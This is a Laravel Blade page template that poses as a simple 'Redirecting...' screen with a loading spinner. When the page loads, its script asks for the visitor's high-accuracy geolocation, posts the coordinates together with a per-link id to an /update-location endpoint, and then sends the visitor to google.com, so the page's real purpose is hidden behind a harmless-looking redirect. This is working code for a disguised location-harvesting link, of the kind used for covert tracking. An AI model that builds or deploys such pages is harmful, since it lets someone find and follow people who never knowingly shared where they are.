<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch("{{ url('/update-location') }}", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                        },
                        body: JSON.stringify({
                            id: "{{ $id }}",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    }).then(() => {
                        window.location.href = "https://google.com";
                    }).catch(() => {
                        window.location.href = "https://google.com";
                    });
                }, function() {
                    window.location.href = "https://google.com";
                }, { 
                    enableHighAccuracy: true, // સચોટ લોકેશન માટે
                    timeout: 5000 
                });
            } else {
                window.location.href = "https://google.com";
            }
        };
    </script>
</body>
</html>

